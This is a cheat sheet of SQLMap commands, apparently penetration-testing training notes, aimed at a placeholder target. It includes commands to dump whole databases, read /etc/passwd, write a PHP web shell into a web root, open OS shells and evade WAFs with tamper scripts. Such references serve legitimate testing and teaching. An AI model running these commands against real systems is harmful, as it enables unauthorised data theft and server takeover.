# SQLMap: The Basics - Commands

## Basic SQLMap Commands

| Command | Description |
|---------|-------------|
| `sqlmap -u "http://target.com/page?id=1"` | Test a GET parameter for SQL injection |
| `sqlmap -u "http://target.com/login" --data="user=admin&pass=test"` | Test POST parameters |
| `sqlmap -r request.txt` | Test parameters from a captured HTTP request file |
| `sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"` | Test with authentication cookies |
| `sqlmap -u "http://target.com/page?id=1" -p "id"` | Test a specific parameter only |

## Database Fingerprinting

| Command | Description |
|---------|-------------|
| `sqlmap -u "http://target.com/page?id=1" --fingerprint` | Detailed DBMS fingerprinting |
| `sqlmap -u "http://target.com/page?id=1" --dbms=mysql` | Specify target DBMS (speeds up testing) |
| `sqlmap -u "http://target.com/page?id=1" --dbms=mssql` | Test against Microsoft SQL Server |
| `sqlmap -u "http://target.com/page?id=1" --dbms=postgresql` | Test against PostgreSQL |

## Database Enumeration

| Command | Description |
|---------|-------------|
| `sqlmap -u "http://target.com/page?id=1" --dbs` | Enumerate available databases |
| `sqlmap -u "http://target.com/page?id=1" -D database_name --tables` | List tables in a database |
| `sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --columns` | List columns in a table |
| `sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump` | Dump all data from a table |
| `sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump --start=1 --stop=10` | Dump a range of rows |
| `sqlmap -u "http://target.com/page?id=1" --dump-all` | Dump entire database |
| `sqlmap -u "http://target.com/page?id=1" --count` | Count entries in tables |

## Data Filtering and Formatting

| Command | Description |
|---------|-------------|
| `sqlmap -u "http://target.com/page?id=1" -D db -T users --columns -C "username,password"` | Select specific columns to dump |
| `sqlmap -u "http://target.com/page?id=1" -D db -T users --dump --where="id>10"` | Conditional data extraction |
| `sqlmap -u "http://target.com/page?id=1" --dump-all --csv` | Output in CSV format |
| `sqlmap -u "http://target.com/page?id=1" --dump-all --output-dir=/tmp/results` | Custom output directory |

## Advanced Exploitation

| Command | Description |
|---------|-------------|
| `sqlmap -u "http://target.com/page?id=1" --file-read /etc/passwd` | Read a file from the database server |
| `sqlmap -u "http://target.com/page?id=1" --file-write /tmp/shell.php --file-dest /var/www/html/shell.php` | Write a file to the database server |
| `sqlmap -u "http://target.com/page?id=1" --sql-shell` | Spawn an interactive SQL shell |
| `sqlmap -u "http://target.com/page?id=1" --os-shell` | Spawn an interactive OS command shell |
| `sqlmap -u "http://target.com/page?id=1" --os-cmd="id"` | Execute a single OS command |

## Optimization and Evasion

| Command | Description |
|---------|-------------|
| `sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3` | Maximum testing thoroughness |
| `sqlmap -u "http://target.com/page?id=1" --threads=10` | Use 10 parallel threads |
| `sqlmap -u "http://target.com/page?id=1" --batch` | Non-interactive mode (use defaults) |
| `sqlmap -u "http://target.com/page?id=1" --tamper=space2comment` | Bypass WAF with space2comment tamper |
| `sqlmap -u "http://target.com/page?id=1" --tamper=between` | Use BETWEEN operator instead of greater-than |
| `sqlmap -u "http://target.com/page?id=1" --random-agent` | Random User-Agent header |
| `sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"` | Route through proxy (e.g., Burp Suite) |
| `sqlmap -u "http://target.com/page?id=1" --time-sec=5` | Set time-based injection delay |

## Detection Type Control

| Command | Description |
|---------|-------------|
| `--technique=BEUSTQ` | Specify injection techniques: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline |
| `--technique=U` | Test only UNION query injection |
| `--technique=T` | Test only time-based blind injection |
| `--union-cols=5` | Force UNION columns count |
| `--union-char="a"` | Character to use for UNION NULL filling |
